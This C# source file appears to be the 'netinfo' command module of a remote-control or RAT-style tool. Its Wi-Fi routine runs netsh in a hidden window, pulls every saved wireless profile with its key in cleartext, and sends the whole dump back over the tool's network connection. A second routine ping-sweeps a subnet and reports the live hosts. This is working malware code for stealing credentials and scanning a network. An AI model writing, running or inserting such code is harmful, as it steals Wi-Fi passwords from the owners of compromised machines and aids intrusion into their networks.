using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using Server.Commands.Core;
using Shared;

namespace Server.Commands
{
    internal class NetInfo : ICommand
    {
        public string name { get; } = "netinfo";

        List<string> upHosts = new List<string>();

        static CountdownEvent countdown;


        public void Process(List<string> args)
        {
            if (args[0] == "wifi")
            {
                Wifi();
            }
            else
            {
                Scan(args);
            }
        }


        void Wifi()
        {
            // Get wifi profiles names
            var cmd = "/C netsh wlan show profiles";
            var proc = new Process
            {
                StartInfo =
                {
                    FileName = "cmd.exe",
                    Arguments = cmd,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    RedirectStandardOutput = true,
                    StandardOutputEncoding = Encoding.GetEncoding(850)
                }
            };
            proc.Start();

            var profiles = proc.StandardOutput.ReadToEnd()
                .Split('\n')
                .Where(x => x.Contains(':') && x.Length > 5)
                .Skip(1)
                .Select(x => x.Substring(x.LastIndexOf(':') + 2, x.Length - x.LastIndexOf(':') - 3))
                .ToList();
            proc.WaitForExit();

            // For each profile, get its informations, including the clear stored key
            var data = "";
            foreach (var profile in profiles)
            {
                proc.StartInfo.Arguments = $"/C netsh wlan show profile \"{profile}\" key=clear";
                proc.Start();
                data += proc.StandardOutput.ReadToEnd();
            }
            data += "{end}";

            ServerCommandsManager.networkManager.WriteLine(data);
        }


        void Scan(List<string> args)
        {
            upHosts.Clear();
            countdown = new CountdownEvent(1);

            var ipRange = GetIpRange(args[1]);

            foreach (var ip in ipRange)
            {
                var ping = new Ping();
                ping.PingCompleted += PingCompletedEventHandler;

                countdown.AddCount();
                ping.SendAsync(ip, 100, ip);
            }
            
            countdown.Signal();
            countdown.Wait();

            ServerCommandsManager.networkManager.WriteLine(upHosts.Count > 0
                ? upHosts.Aggregate((x, y) => $"{x}|{y}")
                : "KO");
        }

        void PingCompletedEventHandler(object sender, PingCompletedEventArgs e)
        {
            if (e.Reply != null && e.Reply.Status == IPStatus.Success)
            {
                upHosts.Add(e.UserState.ToString());
            }

            countdown.Signal();
        }


        #region Ip range calculation

        static IEnumerable<IPAddress> GetIpRange(string ipAndMask)
        {
            var separatorPos = ipAndMask.IndexOf('/');
            var baseIp = ipAndMask.Substring(0, separatorPos);
            var mask = int.Parse(ipAndMask.Substring(separatorPos + 1));

            var firstAndLaspIp = GetFirstAndLastIpByteArray(baseIp, mask);
            var first = ByteArrayIpToInt(firstAndLaspIp.Item1);
            var last = ByteArrayIpToInt(firstAndLaspIp.Item2);

            for (int i = first; i <= last; i++)
            {
                var bytes = BitConverter.GetBytes(i);
                yield return new IPAddress(new[] { bytes[3], bytes[2], bytes[1], bytes[0] });
            }
        }


        static Tuple<byte[], byte[]> GetFirstAndLastIpByteArray(string stringIp, int bits)
        {
            var ip = stringIp.Split('.').Select(x => (byte)int.Parse(x)).ToArray();
            uint mask = ~(uint.MaxValue >> bits);

            // BitConverter gives bytes in opposite order to GetAddressBytes().
            var maskBytes = BitConverter.GetBytes(mask).Reverse().ToArray();

            var startIPBytes = new byte[ip.Length];
            var endIPBytes = new byte[ip.Length];

            // Calculate the bytes of the start and end IP addresses.
            for (var i = 0; i < ip.Length; i++)
            {
                startIPBytes[i] = (byte)(ip[i] & maskBytes[i]);
                endIPBytes[i] = (byte)(ip[i] | ~maskBytes[i]);
            }

            return new Tuple<byte[], byte[]>(startIPBytes, endIPBytes);
        }


        static int ByteArrayIpToInt(byte[] ip)
        {
            var array = ip.Reverse().ToArray();
            return BitConverter.ToInt32(array, 0);
        }

        #endregion Ip range calculation
    }
}
